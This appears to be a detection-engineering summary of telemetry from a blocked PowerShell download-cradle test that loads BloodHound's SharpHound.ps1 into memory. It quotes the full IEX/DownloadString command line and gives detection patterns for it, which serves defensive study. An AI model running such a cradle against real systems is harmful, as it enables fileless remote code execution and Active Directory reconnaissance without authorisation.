# T1059.001-3: PowerShell — Run Bloodhound from Memory using Download Cradle

## Technique Context

T1059.001 represents PowerShell execution, one of the most prevalent attack techniques observed in Windows environments. This specific test demonstrates a common attack pattern: using PowerShell download cradles to fetch and execute malicious code directly in memory without touching disk. The technique combines remote code download (`IEX (New-Object Net.WebClient).DownloadString()`) with in-memory execution of BloodHound, a popular Active Directory reconnaissance tool. Attackers favor this approach because it bypasses many file-based detection mechanisms and leaves minimal forensic artifacts. The detection community focuses on identifying suspicious PowerShell command patterns, network connections to known-bad URLs, and behavioral indicators of AD enumeration tools like BloodHound.

## What This Dataset Contains

The dataset captures a PowerShell download cradle execution that was blocked by Windows Defender. The key evidence appears in Security event 4688, which shows the full malicious command line: `"powershell.exe" & {write-host \"Remote download of SharpHound.ps1 into memory, followed by execution of the script\" -ForegroundColor Cyan IEX (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1'); Invoke-BloodHound -OutputDirectory $env:Temp Start-Sleep 5}`. The process (PID 5780) exits with status `0xC0000022` (STATUS_ACCESS_DENIED), indicating Defender blocked execution.

Sysmon captures rich telemetry including ProcessCreate (EID 1) for a `whoami.exe` subprocess, process access events (EID 10) showing PowerShell accessing the whoami process with full rights (`0x1FFFFF`), and CreateRemoteThread (EID 8) indicating process injection activity. Multiple ImageLoad events (EID 7) show PowerShell loading .NET runtime components, Windows Defender modules (MpOAV.dll, MpClient.dll), and urlmon.dll for network operations. File creation events (EID 11) capture PowerShell profile activities.

## What This Dataset Does Not Contain

The dataset lacks the actual network connection telemetry because Defender blocked the PowerShell process before the download cradle could execute. There are no Sysmon NetworkConnect (EID 3) events showing the HTTPS connection to the GitHub URL, no DNS query events (EID 22) for the raw.githubusercontent.com domain, and no successful file downloads. The PowerShell script block logging (EID 4104) contains only test framework boilerplate scripts for error handling and execution policy bypass - the malicious BloodHound script content was never captured because execution was prevented. Additionally, there are no BloodHound-specific artifacts like CSV output files, LDAP queries, or Active Directory enumeration activities since the tool never ran.

## Assessment

This dataset provides excellent visibility into attempted malicious PowerShell execution through comprehensive Security and Sysmon telemetry. The complete command line capture in Security 4688 events gives analysts the full attack context, while Sysmon events reveal the behavioral patterns around process injection and .NET runtime loading. The fact that Defender blocked execution actually enhances the dataset's value for detection engineering - it shows how blocked attacks still generate rich telemetry for building preventive detections. The combination of command line analysis, process behavior monitoring, and DLL loading patterns provides multiple detection opportunities. However, defenders should complement this with network monitoring data sources to catch cases where endpoint protection fails.

## Detection Opportunities Present in This Data

1. **PowerShell Download Cradle Detection** - Monitor Security 4688 events for command lines containing `IEX` combined with `New-Object Net.WebClient` and `DownloadString` patterns, indicating fileless malware delivery attempts.

2. **BloodHound Invocation Detection** - Alert on PowerShell command lines containing `Invoke-BloodHound` or references to SharpHound.ps1, indicating Active Directory reconnaissance tool usage.

3. **GitHub Raw Content Downloads** - Flag PowerShell processes attempting to download from `raw.githubusercontent.com` URLs, a common hosting location for malicious PowerShell scripts.

4. **PowerShell Process Injection Behavior** - Correlate Sysmon EID 8 (CreateRemoteThread) and EID 10 (ProcessAccess) events from powershell.exe with full access rights (0x1FFFFF) to detect injection attempts.

5. **Suspicious PowerShell Runtime Loading** - Monitor for PowerShell processes loading urlmon.dll in combination with .NET runtime components, indicating potential web-based code execution.

6. **Access Denied Exit Codes** - Track processes exiting with 0xC0000022 status, especially PowerShell, to identify security tool interventions and potential attack attempts.

7. **PowerShell Subprocess Enumeration** - Detect PowerShell spawning discovery tools like whoami.exe, especially when combined with other suspicious indicators like download cradles.
